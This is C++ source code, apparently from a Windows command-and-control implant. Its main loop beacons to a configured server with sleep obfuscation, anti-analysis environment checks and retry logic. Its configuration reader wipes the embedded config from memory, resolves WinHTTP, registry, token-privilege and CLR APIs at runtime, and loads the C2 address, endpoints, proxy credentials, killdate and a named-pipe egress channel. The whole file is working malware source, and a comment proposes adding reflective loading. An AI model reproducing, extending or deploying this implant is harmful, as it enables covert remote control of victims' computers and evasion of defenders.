#include <core/include/implant.hpp>
namespace Implant {

    VOID MainRoutine() {
        HEXANE

        do {
            Opsec::SleepObf();
            Opsec::SeRuntimeCheck();
            if (!Opsec::CheckTime()) {
                continue;
            }

            if (!Ctx->session.checkin && !Ctx->transport.outbound_queue) {
                Opsec::SeCheckEnvironment();

                if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                    return_defer(ntstatus);
                }
            }

            Dispatcher::MessageTransmit();

            if (ntstatus != ERROR_SUCCESS) {
                Ctx->session.retry++;

                if (Ctx->session.retry == 3) {
                    break;
                }
            } else {
                Ctx->session.retry = 0;
            }
        }
        while (ntstatus != ERROR_EXIT);

    defer:
        Memory::Context::ContextDestroy(Ctx);
    }

    VOID ReadConfig() {
        HEXANE

        _parser parser = { };
        Parser::CreateParser(&parser, __config, sizeof(__config));
        x_memset(__config, 0, sizeof(__config));

        Parser::ParserBytecpy(&parser, B_PTR(&Ctx->root));
        Parser::ParserMemcpy(&parser, &Ctx->config.key, nullptr);
        Parser::ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);

        //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->config.Key, FALSE);
        // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary

        if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA))) {
            if (
                !(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
                !(Ctx->modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
                !(Ctx->modules.advapi   = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
                !(Ctx->modules.iphlpapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
                !(Ctx->modules.mscoree  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)))) {
                return_defer(ERROR_MOD_NOT_FOUND);
            }
        }
        else {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        if (
            !(F_PTR_HMOD(Ctx->clr.CLRCreateInstance,              Ctx->modules.mscoree, CLRCREATEINSTANCE)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpOpen,                  Ctx->modules.winhttp, WINHTTPOPEN)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpConnect,               Ctx->modules.winhttp, WINHTTPCONNECT)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpOpenRequest,           Ctx->modules.winhttp, WINHTTPOPENREQUEST)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpAddRequestHeaders,     Ctx->modules.winhttp, WINHTTPADDREQUESTHEADERS)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpSetOption,             Ctx->modules.winhttp, WINHTTPSETOPTION)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpGetProxyForUrl,        Ctx->modules.winhttp, WINHTTPGETPROXYFORURL)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, Ctx->modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpSendRequest,           Ctx->modules.winhttp, WINHTTPSENDREQUEST)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpReceiveResponse,       Ctx->modules.winhttp, WINHTTPRECEIVERESPONSE)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpReadData,              Ctx->modules.winhttp, WINHTTPREADDATA)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpQueryHeaders,          Ctx->modules.winhttp, WINHTTPQUERYHEADERS)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpQueryDataAvailable,    Ctx->modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
            !(F_PTR_HMOD(Ctx->win32.WinHttpCloseHandle,           Ctx->modules.winhttp, WINHTTPCLOSEHANDLE)) ||
            !(F_PTR_HMOD(Ctx->win32.GetAdaptersInfo,              Ctx->modules.iphlpapi, GETADAPTERSINFO)) ||
            !(F_PTR_HMOD(Ctx->win32.CryptStringToBinaryA,         Ctx->modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
            !(F_PTR_HMOD(Ctx->win32.CryptBinaryToStringA,         Ctx->modules.crypt32, CRYPTBINARYTOSTRINGA)) ||
            !(F_PTR_HMOD(Ctx->win32.GetUserNameA,                 Ctx->modules.advapi, GETUSERNAMEA)) ||
            !(F_PTR_HMOD(Ctx->win32.LookupAccountSidW,            Ctx->modules.advapi, LOOKUPACCOUNTSIDW)) ||
            !(F_PTR_HMOD(Ctx->win32.LookupPrivilegeValueA,        Ctx->modules.advapi, LOOKUPPRIVILEGEVALUEA)) ||
            !(F_PTR_HMOD(Ctx->win32.SetEntriesInAclA,             Ctx->modules.advapi, SETENTRIESINACLA)) ||
            !(F_PTR_HMOD(Ctx->win32.AllocateAndInitializeSid,     Ctx->modules.advapi, ALLOCATEANDINITIALIZESID)) ||
            !(F_PTR_HMOD(Ctx->win32.AddMandatoryAce,              Ctx->modules.advapi, ADDMANDATORYACE)) ||
            !(F_PTR_HMOD(Ctx->win32.InitializeSecurityDescriptor, Ctx->modules.advapi, INITIALIZESECURITYDESCRIPTOR)) ||
            !(F_PTR_HMOD(Ctx->win32.InitializeAcl,                Ctx->modules.advapi, INITIALIZEACL)) ||
            !(F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorDacl,    Ctx->modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
            !(F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorSacl,    Ctx->modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
            !(F_PTR_HMOD(Ctx->win32.RegOpenKeyExA,                Ctx->modules.advapi, REGOPENKEYEXA)) ||
            !(F_PTR_HMOD(Ctx->win32.RegCreateKeyExA,              Ctx->modules.advapi, REGCREATEKEYEXA)) ||
            !(F_PTR_HMOD(Ctx->win32.RegSetValueExA,               Ctx->modules.advapi, REGSETVALUEEXA)) ||
            !(F_PTR_HMOD(Ctx->win32.RegCloseKey,                  Ctx->modules.advapi, REGCLOSEKEY)) ||
            !(F_PTR_HMOD(Ctx->win32.AdjustTokenPrivileges,        Ctx->modules.advapi, ADJUSTTOKENPRIVILEGES)) ||
            !(F_PTR_HMOD(Ctx->win32.FreeSid,                      Ctx->modules.advapi, FREESID))) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        Ctx->session.peer_id    = Parser::UnpackDword(&parser);
        Ctx->config.sleeptime   = Parser::UnpackDword(&parser);
        Ctx->config.jitter      = Parser::UnpackDword(&parser);
        Ctx->config.hours       = Parser::UnpackDword(&parser);
        Ctx->config.killdate    = Parser::UnpackDword64(&parser);

        Ctx->transport.outbound_queue = nullptr;

#ifdef TRANSPORT_HTTP
        Ctx->transport.http = S_CAST(_http_context*, x_malloc(sizeof(_http_context)));

        Ctx->transport.http->handle     = nullptr;
        Ctx->transport.http->endpoints  = nullptr;
        Ctx->transport.http->headers    = nullptr;

        Parser::ParserWcscpy(&parser, &Ctx->transport.http->useragent, nullptr);
        Parser::ParserWcscpy(&parser, &Ctx->transport.http->address, nullptr  );
        Ctx->transport.http->port = S_CAST(int, Parser::UnpackDword(&parser));

        Ctx->transport.http->n_endpoints = Parser::UnpackDword(&parser);
        Ctx->transport.http->endpoints  = S_CAST(wchar_t**, x_malloc(sizeof(wchar_t*) * ((Ctx->transport.http->n_endpoints + 1) * 2)));

        for (auto i = 0; i < Ctx->transport.http->n_endpoints; i++) {
            Parser::ParserWcscpy(&parser, &Ctx->transport.http->endpoints[i], nullptr);
        }

        Ctx->transport.http->endpoints[Ctx->transport.http->n_endpoints + 1] = nullptr;

        Parser::ParserStrcpy(&parser, &Ctx->transport.domain, nullptr  );
        Ctx->transport.b_proxy = Parser::UnpackBool(&parser);

        if (Ctx->transport.b_proxy) {
            Ctx->transport.http->access = INTERNET_OPEN_TYPE_PROXY;

            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->address, nullptr );
            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->username, nullptr );
            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->password, nullptr );

        } else {
            Ctx->transport.http->proxy->username = nullptr;
            Ctx->transport.http->proxy->password = nullptr;
        }
#endif
#ifdef TRANSPORT_PIPE
        Ctx->transport.sbm = R_CAST(_smb_context*, x_malloc(sizeof(_smb_context)));
        Parser::ParserWcscpy(&parser, &Ctx->config.egress_pipe, nullptr);
#endif
    defer:
        Parser::DestroyParser(&parser);
    }
}

VOID Entrypoint(HMODULE Base) {

    NT_ASSERT(Memory::Context::ContextInit());
    NT_ASSERT(Memory::Context::ResolveApi());
    NT_ASSERT(Implant::ReadConfig());
    Implant::MainRoutine();
}
